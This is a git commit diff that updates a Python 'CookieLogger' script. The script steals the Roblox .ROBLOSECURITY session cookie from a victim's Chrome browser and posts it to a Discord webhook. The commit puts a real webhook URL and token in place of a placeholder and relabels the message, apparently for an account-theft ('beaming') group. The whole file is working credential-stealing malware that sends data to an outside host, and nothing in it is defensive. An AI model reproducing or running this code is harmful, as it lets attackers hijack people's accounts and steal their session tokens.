2508144b02584ae8f8d0854d182460f98a265c94
kysmonkeyboy <143054869+kysmonkeyboy@users.noreply.github.com>
2025-03-16 00:19:07 -0500

    Update CookieLogger.py

--- CookieLogger.py
+++ CookieLogger.py
@@ -1,13 +1,13 @@
 import browser_cookie3, requests, threading, discord_webhook
 
-webhook = 'YOUR WEBHOOK HERE'
+webhook = 'https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR'
 
 def chrome_logger():
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
+        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers ZYRO: {cookie}```'})
     except:
         pass
 browsers = [chrome_logger]
